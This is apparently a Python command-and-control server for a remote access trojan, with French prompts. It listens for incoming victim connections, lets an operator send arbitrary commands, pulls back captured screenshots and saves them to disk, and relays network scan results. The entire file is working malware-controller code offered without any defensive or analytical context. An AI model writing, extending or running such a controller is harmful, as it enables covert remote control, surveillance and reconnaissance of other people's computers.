import socket
import threading

ip_address = '0.0.0.0'
port_number = 1234

def handle_connection(connection, address):
    print(f"Connexion établie avec {address}")
    while True:
        try:
            command = input("Entrer une commande a exécuter : ")
            if command.lower() == 'quit':
                connection.send(b'quit')
                break
            connection.send(command.encode())
            if command.lower() == 'screenshot':
                img_size = int(connection.recv(1024).decode())
                connection.send(b'OK')
                img_data = b''
                while len(img_data) < img_size:
                    packet = connection.recv(4096)
                    if not packet:
                        break
                    img_data += packet

                with open("screen.png", "wb") as f:
                    f.write(img_data)
                print("Capture réussie !")
                continue

            elif command.startswith("scan"):
                print("Scan en cours...")
                response = connection.recv(4096).decode()
                print(f"Résultat du scan :\n{response}")
                continue

            response = connection.recv(4096).decode()
            print(f"Output:\n{response}")
        except Exception as e:
            print(f"Error: {e}")
            break

    connection.close()

def start_server():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_address, port_number))
    ss.listen(5)
    print(f"Serveur en écoute sur {ip_address}:{port_number}")

    while True:
        connection, address = ss.accept()
        thread = threading.Thread(target=handle_connection, args=(connection, address))
        thread.start()

if __name__ == "__main__":
    start_server()
